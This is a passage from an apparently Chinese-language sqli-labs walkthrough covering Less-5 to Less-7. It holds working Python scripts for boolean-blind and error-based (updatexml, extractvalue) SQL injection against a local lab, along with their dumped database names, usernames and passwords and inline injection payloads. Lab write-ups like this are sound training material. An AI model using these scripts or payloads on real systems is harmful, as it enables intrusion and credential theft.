</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39; or ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;You are in&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_column_name</span><span class="p">():</span>  <span class="c1"># id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39; or ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;You are in&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_username</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39; or ascii(substr((select binary group_concat(username) from users) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;You are in&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39; or ascii(substr((select binary group_concat(password) from users) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;You are in&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">get_username</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">get_password</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
</span></span><span class="line"><span class="cl">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以进行报错注入</p>
<ol>
<li>利用<code>updatexml</code>函数(该函数对输出的字符长度做了限制,其最长输出32位)</li>
</ol>
<p>传入<code>?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1)--%20</code></p>
<p>返回<code>XPATH syntax error: '~information_schema,m~'</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20123917.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20123917.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20123917.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20123917.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20123917.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20123917.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/Less-5/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_database_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;&#39;~(.+?)~&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),</span><span class="si">%d</span><span class="s2">,20) from information_schema.schemata),0x7e),1)-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_table_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;&#39;~(.+?)~&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),</span><span class="si">%d</span><span class="s2">,20) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_column_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;&#39;~(.+?)~&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),</span><span class="si">%d</span><span class="s2">,20) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1)-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_username</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;&#39;~(.+?)~&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(username),</span><span class="si">%d</span><span class="s2">,20) from users),0x7e),1)-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">rule</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;&#39;~(.+?)~&#39;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=1&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),</span><span class="si">%d</span><span class="s2">,20) from users),0x7e),1)-- &#34;</span> <span class="o">%</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">rule</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span> <span class="o">+=</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_database_name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_table_name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_column_name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_username</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get_password</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">information_schema,mysql,security,person,performance_schema,challenges
</span></span><span class="line"><span class="cl">users,uagents,emails,referers
</span></span><span class="line"><span class="cl">id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
</span></span><span class="line"><span class="cl">Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
</span></span><span class="line"><span class="cl">Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="2">
<li>利用<code>extractvalue</code>函数</li>
</ol>
<p>传入<code>?id=1' and extractvalue(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e))--%20</code></p>
<p>返回<code>XPATH syntax error: '~information_schema,m~'</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20124112.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20124112.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20124112.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-10-27%20124112.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20124112.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-10-27%20124112.png" /></p>
<h3 id="less-6">Less-6</h3>
<p>把Less-5的单引号改成双引号</p>
<h3 id="less-7">Less-7</h3>
<p>传入<code>?id=1</code>,返回<code>You are in.... Use outfile......</code>提示使用导出数据到文件的方式来进行注入</p>
<p>传入<code>?id=1'</code>,返回<code>You have an error in your SQL syntax</code>,传入<code>?id=1' or 1=1--%20</code>,仍然返回<code>You have an error in your SQL syntax</code></p>
<p>测试得出的正确闭合方式为<code>?id=1')) or 1=1--%20</code></p>
<ol>
<li>
